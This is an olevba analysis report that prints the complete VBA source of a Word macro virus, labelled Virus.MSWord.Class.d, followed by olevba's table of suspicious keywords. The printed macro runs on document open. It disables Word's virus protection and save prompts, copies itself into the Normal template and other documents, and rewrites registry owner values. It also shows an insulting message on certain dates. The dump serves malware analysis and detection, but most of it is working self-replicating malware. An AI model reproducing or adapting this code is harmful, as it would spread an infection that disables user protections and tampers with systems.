olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-f557f1bd80393c8b39108ee2192610ed88939331
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-f557f1bd80393c8b39108ee2192610ed88939331 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'Larry Ryan2000-04-19 9:20:23 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
Const REG_SZ As Long = 1
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
Const HKEY_CURRENT_USER As Long = &H80000001
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
Sub AutoOpen()
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
On Error GoTo out
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
Options.VirusProtection = False
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
Options.SaveNormalPrompt = False
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
Options.ConfirmConversions = False
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
If nt > 70 And ad > 0 Then GoTo out
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
If nt < 70 Then
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
End If
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
host.codemodule.AddFromFile ("c:\class.sys")
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
With host.codemodule
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
    For x = 1 To 16
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
    .deletelines 1
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
    Next x
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
End With
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
If nt < 70 Then
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
    With host.codemodule
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
    .replaceline 1, "Sub AutoClose()"
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
    .replaceline 91, "Sub ToolsMacro()"
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
    For x = 70 To 81
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
        .deletelines 62
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
    Next x
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
    .replaceline 35, "    For x = 1 To 4"
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
    End With
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
End If
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
If nt < 70 Then
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
u = RegCloseKey(k)
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
End If
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
With host.codemodule
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
    For x = 2 To 104 Step 2
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
    Next x
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
End With
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
out:
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
End Sub
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
Sub ViewVBCode()
'Larry Ryan2000-04-19 9:20:24 AMHP DeskJet 720C Series on LPT1:Transportation Technology Test
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
